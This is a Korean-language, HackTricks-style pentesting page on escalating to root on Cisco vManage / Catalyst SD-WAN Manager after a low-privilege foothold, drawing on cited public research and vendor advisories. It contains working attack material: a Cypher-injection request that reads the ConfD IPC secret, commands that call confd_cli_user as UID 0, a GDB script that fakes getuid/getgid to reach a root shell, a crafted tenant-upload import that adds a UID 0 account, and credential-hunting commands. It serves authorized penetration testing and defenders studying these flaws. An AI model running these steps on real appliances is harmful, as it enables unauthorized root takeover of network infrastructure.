# Cisco - vmanage

Cisco vManage / *Catalyst SD-WAN Manager*에서 `vmanage`, `netadmin` 또는 `vmanage-admin` 권한으로 code execution을 확보했다면, 가장 주목할 만한 local privesc 공격 표면은 일반적으로 `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs, 그리고 root 소유의 import/upload handler입니다.

controller에서 아직 **initial foothold**가 필요한 경우 먼저 전용 control-plane 페이지를 확인하세요:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## 신속한 local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
`/etc/confd/confd_ipc_secret`을 foothold에서 읽을 수 있다면 Path 1과 Path 2를 즉시 실제로 활용할 수 있습니다. remote file disclosure 또는 webshell을 통해 접근한 경우에는 `vmanage-admin` SSH material과 multitenancy upload handler도 검사해야 합니다. 최근 연구에서 두 가지 모두 실행 가능한 pivot으로 입증되었습니다.<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Synacktiv의 vManage assessment에서는 이 root-shell 경로를 문서화했습니다.<sup>[[5]](#references)</sup>

보고서에서 링크한 [ConfD documentation](http://66.218.245.39/doc/html/rn03re18.html)에는 IPC authentication이 설명되어 있습니다. vManage 예제에서는 secret이 `/etc/confd/confd_ipc_secret`에 있으며 `vmanage` 사용자가 읽을 수 있음을 보여 줍니다.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
보고된 설정에서 Neo4j는 `vmanage` 권한으로 실행되므로, 앞서 언급한 Cypher injection을 통해 secret file을 읽을 수 있습니다.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 자체는 명령줄 인수를 허용하지 않으며, `/usr/bin/confd_cli_user`를 호출합니다. 보고된 workflow에서는 root에서 읽을 수 있는 해당 helper를 rootfs에서 추출하고, `scp`를 통해 복사한 뒤, help를 확인하고, `CONFD_IPC_ACCESS_FILE`을 설정한 다음 `-U 0 -G 0` 옵션과 함께 호출하여 root shell을 얻습니다.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## 경로 2

이 대체 경로는 Walmart Global Tech의 vManage 19.2.2 research를 기반으로 합니다.<sup>[[6]](#references)</sup>

Synacktiv 경로에는 `/usr/bin/confd_cli_user`의 사본이 필요하며, 보고된 설정에서는 root가 이를 읽을 수 있습니다. 반면 Walmart 보고서에서는 GDB를 사용해 `confd_cli`의 identity 값을 변경합니다.<sup>[[5]](#references)[[6]](#references)</sup>

해당 보고서의 disassembly에서는 `confd_cli`가 호출자의 UID와 GID를 수집하는 과정이 나타납니다.<sup>[[6]](#references)</sup>

<details>
<summary>UID/GID 수집을 보여주는 Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

동일한 테스트에서 명시적인 `-g` 및 `-u` 값을 받는 root 소유의 `cmdptywrapper`가 확인되었습니다.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
연구자는 `confd_cli`가 로그인한 사용자의 UID와 GID를 `cmdptywrapper`로 전달한다고 추론했습니다.<sup>[[6]](#references)</sup>

`cmdptywrapper`를 `-g 0 -u 0` 옵션으로 직접 실행하면 필요한 파일 디스크립터(예시에서는 `-i 1015`)를 사용할 수 없기 때문에 실패했습니다.<sup>[[6]](#references)</sup>

`confd_cli`는 해당 값을 인수로 노출하지 않으므로, 보고서에서는 GDB를 사용해 `getuid()` 및 `getgid()`의 반환값을 재정의했습니다. 해당 appliance에는 GDB가 설치되어 있었습니다.<sup>[[5]](#references)[[6]](#references)</sup>

`vmanage` 액세스 권한이 있으면 테스트에서 `/etc/confd/confd_ipc_secret`을 읽을 수 있었으며, 다음 스크립트는 두 identity 호출이 모두 0을 반환하도록 강제합니다.<sup>[[6]](#references)</sup>

보고서에서 사용한 GDB 스크립트는 다음과 같습니다.<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
보고된 콘솔 출력은 다음과 같습니다:<sup>[[6]](#references)</sup>

<details>
<summary>콘솔 출력</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco는 이후 자체 [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) advisory에서 더 깔끔한 local root 경로를 문서화했습니다. **read-only privileges만 가진 authenticated attacker**가 manager CLI에 조작된 request를 전송하고, 불충분한 input validation으로 인해 root 권한을 획득할 수 있었습니다.<sup>[[7]](#references)</sup>

offensive 관점에서 이 advisory와 앞선 CLI research는 다음과 같은 workflow를 제시합니다.<sup>[[6]](#references)[[7]](#references)</sup>

1. box에서 *any* low-priv foothold를 확보했다면, 더 복잡한 Path 1 / Path 2 workflow를 시도하기 전에 local CLI service를 테스트해야 합니다.
2. Path 2의 artifacts를 재사용하여 trust boundary를 찾습니다: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend로 전달되는 모든 field를 suspicious하게 취급합니다: UID/GID, username, terminal metadata, imported files 또는 이후 root-owned helper가 소비하는 모든 value.
4. low-priv user가 local CLI socket에 접근하고 이러한 field에 영향을 줄 수 있다면, root 권한 획득은 조작된 request 하나만으로 가능할 수 있습니다.

appliance에 진입한 후에는 다음과 같이 local CLI chain을 검사합니다.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
이것은 2025년 버그를 재사용 가능한 hunting pattern으로 바꿉니다. 즉, **userland에서 identity를 수집한 뒤 이를 privileged wrapper로 전달하는 local CLI shim**을 찾는 것입니다.<sup>[[6]](#references)[[7]](#references)</sup>

**CVE-2025-20122**를 이후에 발견된 **CVE-2026-20122**와 혼동하지 마세요. 2025년 이슈는 *local* CLI-to-root 버그인 반면, 2026년 이슈는 *remote* API arbitrary file overwrite이며, 주로 foothold를 심은 다음 Path 1 / Path 2 / Path 4를 다시 살펴보는 데 유용합니다.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco의 2026년 2월 advisory는 또 다른 유용한 privesc class인 [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)을 설명합니다. **인증된 local low-priv attacker**는 REST API의 불충분한 user-authentication mechanism 때문에 root 권한을 획득할 수 있습니다.<sup>[[1]](#references)</sup>

이는 vManage privesc가 더 이상 `confd`/TTY abuse에만 국한되지 않기 때문에 중요합니다. low-priv shell을 얻은 후에는 다음 항목도 hunt해야 합니다.<sup>[[1]](#references)</sup>

- caller를 지나치게 신뢰하는 localhost-only API endpoints
- 현재 account에서 읽을 수 있는 tokens, cookies 또는 service credentials
- 여전히 local에서 trigger할 수 있는 `dataservice`/REST handlers를 통해 노출된 root-only actions

실제로 `vmanage` 또는 다른 service user로 shell을 확보한 뒤에는 local API abuse가 interactive CLI abuse보다 자동화하기 쉬울 수 있습니다.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
로컬 세션 context만으로 privileged REST 기능에 접근할 수 있다면 API path를 우선 사용하세요. replay, script 작성 및 탈취한 web session이나 API token과의 chain 구성이 더 쉽습니다.<sup>[[1]](#references)</sup>

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

또 다른 최근 패턴은 [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)입니다. `netadmin` privileges를 가진 local attacker는 **crafted file**을 upload할 수 있었고, 이후 CLI가 이를 안전하지 않게 처리하면서 `root` 권한으로 command injection이 발생했습니다.<sup>[[2]](#references)</sup>

HackTricks 관점에서 중요한 technique은 특정 CVE보다 더 광범위합니다.<sup>[[2]](#references)</sup>

1. 파일을 허용하는 모든 CLI 또는 web workflow를 열거합니다. 예: imports, diagnostic bundles, templates, validators, backups, tenant data 등
2. 업로드된 파일이 저장되는 위치와 이를 사용하는 root-owned script 또는 binary를 추적합니다.
3. filename, file content 또는 parsed metadata가 shell commands, wrapper scripts 또는 `system()`-style helpers에 전달되는지 확인합니다.
4. 이미 `netadmin`에 접근할 수 있다면(valid creds, stolen session 또는 auth-bypass chain), file-processing bugs가 root로 가는 가장 빠른 path인 경우가 많습니다.

이후 Google Cloud / Mandiant는 multitenancy import path를 통해 이 bug class가 실제로 exploit된 구체적인 사례를 공개했습니다.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
관찰된 공격에서 조작된 CSV는 `/etc/passwd`와 `/etc/shadow`를 수정하여 임시 UID 0 계정(`troot`)을 생성했습니다. 따라서 `tenant-upload` / `tenant-list`와 같은 importers는 특히 주목할 만합니다. 이는 단순한 data-ingestion 기능이 아니라, 잠재적으로 root-owned parser front-end이기 때문입니다.<sup>[[4]](#references)</sup>

빠르게 shell 측면에서 hunting할 때 사용할 수 있는 패턴은 다음과 같습니다:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
이 버그 클래스는 `root`가 아닌 `netadmin` 권한을 부여하는 remote foothold와 특히 효과적으로 chain됩니다.<sup>[[2]](#references)[[4]](#references)</sup>

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **인증되지 않은 info leak (CVE-2026-20133)** – 공개 research에서 `confd_ipc_secret` 또는 `vmanage-admin` private key가 노출될 수 있음이 확인되었기 때문에 특히 가치가 높습니다. 이를 통해 read bug가 Path 1 또는 NETCONF pivot으로 전환될 수 있습니다.<sup>[[3]](#references)</sup>
- **인증된 API arbitrary file overwrite (CVE-2026-20122)** – 위의 2025 CLI bug와는 다릅니다. VulnCheck는 이를 사용해 webshell을 업로드했으며, 이후 이 페이지의 local privesc 경로가 즉시 중요해집니다.<sup>[[3]](#references)</sup>
- **인증된 UI XSS (CVE-2024-20475)** – 인증된 attacker는 영향을 받는 사용자의 web interface에서 script를 실행할 수 있습니다. 그 결과 생성된 session context가 `vshell` 또는 위의 local privesc 경로 중 하나에 도달하는 API/CLI actions를 노출하는지 assess해야 합니다.<sup>[[9]](#references)</sup>
- **remote auth bypass를 통한 `netadmin` 획득 (CVE-2026-20129)** – `netadmin`은 2026 crafted-file privesc에 정확히 필요한 level이므로 Path 5의 매우 강력한 precursor입니다.<sup>[[2]](#references)[[3]](#references)</sup>
- **인증된 arbitrary file write (CVE-2026-20262)** – 이후 web UI upload path를 통해 수행된다는 점을 제외하면 CVE-2026-20122와 유사한 offensive value를 가집니다. Cisco는 이 bug로 생성되거나 덮어쓴 file을 나중에 root로 elevate하는 데 사용할 수 있다고 설명합니다.<sup>[[10]](#references)</sup>
- **downgrade를 통한 구형 CLI privesc 부활 (CVE-2022-20775)** – 2026년 intrusions에서 attacker가 이전의 취약한 SD-WAN build로 rollback하고, 구형 CLI root bug를 악용한 다음, 원래 version을 복원할 수 있음이 확인되었습니다.<sup>[[8]](#references)</sup>
- **pre-auth control-plane auth bypass (CVE-2026-20182)** – 전용 SD-WAN control-plane 페이지에 더 자세히 설명되어 있습니다. 이 bug는 `vmanage-admin`의 SSH key를 추가할 수 있게 하여, 후속 management-plane actions를 위한 persistent NETCONF access를 제공합니다.<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - 최근 Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Cisco Catalyst SD-WAN Manager의 Vulnerability (CVE-2026-20245) Zero-Day Exploitation](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: vManage 공격](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — CSRF에서 Remote Code Execution까지](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [UAT-8616에 의한 Cisco Catalyst SD-WAN Active exploitation (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Cisco Catalyst SD-WAN Manager Arbitrary File Write Vulnerability (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Cisco Catalyst SD-WAN Controller의 Critical authentication bypass](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
